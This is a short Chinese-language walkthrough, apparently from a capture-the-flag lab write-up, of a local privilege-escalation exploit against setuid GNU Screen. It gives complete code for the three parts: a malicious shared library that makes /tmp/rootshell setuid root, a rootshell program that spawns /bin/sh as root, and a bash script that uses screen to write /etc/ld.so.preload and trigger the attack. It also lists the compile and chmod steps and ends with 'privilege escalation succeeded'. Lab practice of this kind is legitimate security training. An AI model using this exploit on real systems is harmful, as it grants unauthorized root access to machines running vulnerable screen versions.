根据文档分为三步  

第一步：

将代码复制出来,生成libhax.c文件

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
\_\_attribute\_\_ ((\_\_constructor\_\_))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("\[+\] done!\\n");
}
```

gcc编译 生成libhax.so

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```

![](../Images/14a701bc19b7106fa7d886c6f4936564.png)

第二步：  

将第二段代码复制出来，生成rootshell

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

gcc编译 生成rootshell

```
gcc -o rootshell rootshell.c
```

![](../Images/5010c0eb4de240cde9fb25b119d5f63e.png)

第三步：  

复制最后几行代码，生成.sh文件

```
#!/bin/bash
echo "\[+\] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen \-D \-m \-L ld.so.preload echo \-ne  "\\x0a/tmp/libhax.so" # newline needed
echo "\[+\] Triggering..."
screen \-ls # screen itself is setuid, so... 
/tmp/rootshell
```

![](../Images/b20e348afbcc10a1889fd277227dc6e6.png)

![](../Images/396ac61134318d47a0c35c96513f729d.png)

将三个文件丢到tmp目录下，并加上权限

![](../Images/ee463bf45fbbf5f6dd221e65d1c09215.png)

```
chmod 777 dc5.sh

```

提权成功
